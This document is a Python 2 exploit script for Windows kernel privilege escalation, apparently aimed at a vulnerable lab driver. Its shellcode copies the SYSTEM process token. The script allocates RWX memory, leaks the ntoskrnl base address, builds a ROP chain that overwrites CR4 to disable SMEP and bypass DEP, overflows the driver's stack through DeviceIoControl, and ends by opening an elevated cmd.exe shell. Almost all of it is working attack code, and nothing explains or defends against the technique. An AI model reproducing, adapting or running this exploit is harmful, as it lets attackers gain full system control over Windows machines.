#stack overflow , ROP, DEP bypass, SMEP bypass
import struct
import sys
import os
from ctypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi


payload = bytearray(
    "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              
    "\x48\x8B\x80\xB8\x00\x00\x00"                     
    "\x48\x89\xC3"                                    
    "\x48\x8B\x9B\xE8\x02\x00\x00"                      
    "\x48\x81\xEB\xE8\x02\x00\x00"                      
    "\x48\x8B\x8B\xE0\x02\x00\x00"                     
    "\x48\x83\xF9\x04"                                  
    "\x75\xE5"                                          
    "\x48\x8B\x8B\x58\x03\x00\x00"                      
    "\x80\xE1\xF0"                                      
    "\x48\x89\x88\x58\x03\x00\x00"                      
    "\x48\x83\xC4\x40"                                  
    "\xC3"                                              
)
print "[+] Allocating RWX region for shellcode"
ptr = kernel32.VirtualAlloc(
    c_int(0),                         # lpAddress
    c_int(len(payload)),              # dwSize
    c_int(0x3000),                    # flAllocationType
    c_int(0x40)                       # flProtect
)

c_type_buffer = (c_char * len(payload)).from_buffer(payload)

print "[+] Copying shellcode to newly allocated RWX region"
kernel32.RtlMoveMemory(
    c_int(ptr),                       # Destination (pointer)
    c_type_buffer,                    # Source (pointer)
    c_int(len(payload))               # Length
)

base = (c_ulonglong * 1024)()

print "[+] Calling EnumDeviceDrivers()..."

get_drivers = psapi.EnumDeviceDrivers(
    byref(base),                      # lpImageBase (array that receives list of addresses)
    sizeof(base),                     # cb (size of lpImageBase array, in bytes)
    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
)
if not base:
    print "[+] EnumDeviceDrivers() function call failed!"
    sys.exit(-1)
kernel_address = base[0]

print "[+] Found kernel leak!"
print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))

input_buffer = ("\x41" * 2056)
print "[+] begining ROP chain.. bypass SMEP..."
input_buffer += struct.pack('<Q', kernel_address + 0x3544)     

print "[+] Flipped SMEP bit to 0 in RCX..."
input_buffer += struct.pack('<Q', 0x506f8)           		

print "[+] Placed disabled SMEP value in CR4..."
input_buffer += struct.pack('<Q', kernel_address + 0x108552)    

print "[+] SMEP disabled!"
input_buffer += struct.pack('<Q', ptr)                          

input_buffer_length = len(input_buffer)

print "[+] Using CreateFileA() to obtain and return handle referencing the driver..."
handle = kernel32.CreateFileA(
    "\\\\.\\Driver", # lpFileName
    0xC0000000,                         # dwDesiredAccess
    0,                                  # dwShareMode
    None,                               # lpSecurityAttributes
    0x3,                                # dwCreationDisposition
    0,                                  # dwFlagsAndAttributes
    None                                # hTemplateFile
)
print "[+] Interacting with the driver..."
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x222003,                           # dwIoControlCode
    input_buffer,                       # lpInBuffer
    input_buffer_length,                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

os.system("cmd.exe /k cd C:\\")
